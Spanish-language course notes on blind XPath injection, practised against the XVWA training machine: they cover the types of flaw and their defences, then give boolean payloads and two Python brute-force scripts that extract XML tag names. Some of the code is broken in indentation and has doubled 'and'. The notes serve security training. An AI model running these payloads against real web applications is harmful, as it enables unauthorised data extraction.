- Tags : #inyecciones_xpath

**XPath** es un lenguaje de consultas utilizado en **XML** que permite buscar y recuperar información específica de **documentos XML**. Sin embargo, al igual que otros lenguajes de programación y consultas, XPath también puede tener **vulnerabilidades** que los atacantes pueden aprovechar para comprometer la seguridad de una aplicación web.

Las **vulnerabilidades XPath** son aquellas que se aprovechan de las debilidades en la implementación de consultas XPath en una aplicación web. A continuación, se describen algunos tipos de vulnerabilidades comunes en XPath:

- **Inyección XPath**: los atacantes pueden utilizar inyección de código malicioso en las consultas XPath para alterar el comportamiento esperado de la aplicación. Por ejemplo, pueden agregar una consulta maliciosa que recupere toda la información del usuario, incluso información confidencial como contraseñas.
- **Fuerza bruta de XPath**: los atacantes pueden utilizar técnicas de fuerza bruta para adivinar las rutas de XPath y recuperar información confidencial. Esta técnica se basa en intentar diferentes rutas XPath hasta encontrar una que devuelva información confidencial.
- **Recuperación de información del servidor**: los atacantes pueden utilizar consultas XPath maliciosas para obtener información sobre el servidor, como el tipo de base de datos, la versión de la aplicación, etc. Esta información puede ayudar a los atacantes a planear ataques más sofisticados.
- **Manipulación de respuestas XPath**: los atacantes pueden manipular las respuestas XPath de la aplicación web para obtener información adicional o alterar el comportamiento de la aplicación. Por ejemplo, pueden modificar una respuesta XPath para crear una cuenta de usuario sin permiso.

Para protegerse contra las vulnerabilidades de XPath, es importante validar todas las entradas de usuario y evitar la construcción dinámica de consultas XPath. Además, se recomienda restringir los permisos de acceso a los recursos de la aplicación web y mantener actualizado el software y los sistemas operativos. Por último, se recomienda utilizar herramientas de análisis de seguridad y realizar pruebas de penetración regulares para identificar y corregir cualquier vulnerabilidad en la aplicación web.

A continuación, se proporciona el enlace directo de descarga a la máquina XVWA 1 de Vulnhub, la cual usamos en esta clase para explotar las vulnerabilidades existentes en XPath:

- **XVWA 1**: [https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)

Como Identificar que debemos hacer *Inyecciones XPath* primero probariamos las inyecciones clasiacas como *sql injection y nosql injection*

**Recurso HackerTricks**: [https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html](https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html)

La idea de este ataque es poder armar la estructura completa de etiquetas para poder extraer todos los datos
Primeramente haremos un conteo de las etiquetas primarias
![](../../../attachments/Pasted%20image%2020260217154157.png)
Esto hace un conteo de la etiqueta principal para ver vuantas hay en este caso le indicamos 1 y nos da respuesta correcta si ponemos 2 no nos devolverá nada

![](../../../attachments/Pasted%20image%2020260217154452.png)

![](../../../attachments/Pasted%20image%2020260217154551.png)

De aquí determinamos que existe una etiqueta principal cuyo nombre desconocemos pero ya sabemos que solo hay una y que dentro se desglosan los datos, así que la representaríamos 
```xml
<>
</>
```

Para determinar el nombre de esta etiqueta haríamos lo que hacíamos con las inyecciones sql basadas en tiempo o las booleanas para determinar cada uno de los caracteres.
```xml
and substring(name(/*[1]/*[1]),1,1) = "a" #El primer caracter de la etiqueta es "a" `<a>` 
```

![[Pasted image 20260217155442.png]]


![[Pasted image 20260217162034.png]]

```xml
and substring(name(/*[1]),1,1)='a #El primer caracter de la etiqueta es "a" 
```

De obtener algo seguimos incrementando hasta irnos del rango para identificar la cantidad de caracteres

Script de python para identificar las etiquetas

```python
#!/usr/bin/python3

from pwn import *
import requests
import time
import sys
import pdb
import string
import signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.111.41/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():

    data = ""
	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando ataque de fuerza bruta")
	time.sleep(2)
	p2 = log.progress("Data")
    for position in range(1, 8):
        for character in characters:

            post_data = {
                'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)
			
			if len(r.text) != 8681:
				data+=character
				p2.status(data)
				break
            print(len(r.text))
	p1.success("Ataque de fuerza bruta concluido")
	p2.success(data)
if __name__ == '__main__':

    xPathInjection()
```

Conociendo el nombre de la etiqueta primaria o las etiquetas primaria intentamos descubrir cuantas tiene internamente esta. utilizando la condicional `search=1' and count(/*[1]/*)>7&submit=`  mientras nos devuelva resultado estamos por buen camino 

![](../../../attachments/Pasted%20image%2020260217164535.png)


Para saber el nombre de la primera etiqueta dentro de la etiqueta principal utilizamos al igual que anteriormente 
`search=1' and name(/*[1]/*[1])='10&submit=` donde el primer [1] hace referencia a la etiqueta primaria y el segundo [1] hace referencia a la primera etiqueta dentro de la etiqueta primaria para hacer referencia a la segunda seria 
`search=1' and count(/*[1]/*[2])>7&submit=` y así sucesivamente hasta la cantidad de subetiquetas detectadas 

Para identificar el nombre haríamos lo mismo que anteriormente cambiando solo la estructura
```xml
and and substring(name(/*[1]/*[1]),1,1)='a #El primer caracter de la subetiqueta es "a"  
```

Y asi variariamos por el orden de las subetiquetas
```xml
and and substring(name(/*[1]/*[2]),1,1)='a #El primer caracter de la subetiqueta es "a"  

and and substring(name(/*[1]/*[3]),1,1)='a #El primer caracter de la subetiqueta es "a"  

```

Utilizaríamos la el mismo script de python con algunas modificaciones, la estructura de la petición para apuntar a la etiqueta sugeridas

```python
from pwn import *
import requests
import time
import sys
import pdb
import string
import signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.111.41/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():

    data = ""
	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando ataque de fuerza bruta")
	time.sleep(2)
	p2 = log.progress("Data")
	
for first_position in range(1, 6):
            for second_position in range(1, 21):
                for character in characters:

                    post_data = {
                        'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
                        'submit': ''
                    }

                    r = requests.post(main_url, data=post_data)

                    if len(r.text) != 8691 and len(r.text) != 8692:
                        print(len(r.text))
                        data += character
                        p2.status(data)
                        break

            if first_position != 5:
                data += ":"

    p1.success("Ataque de fuerza bruta concluido")
    p2.success(data)

if __name__ == '__main__':

    xPathInjection()
```

![[Pasted image 20260217172500.png]]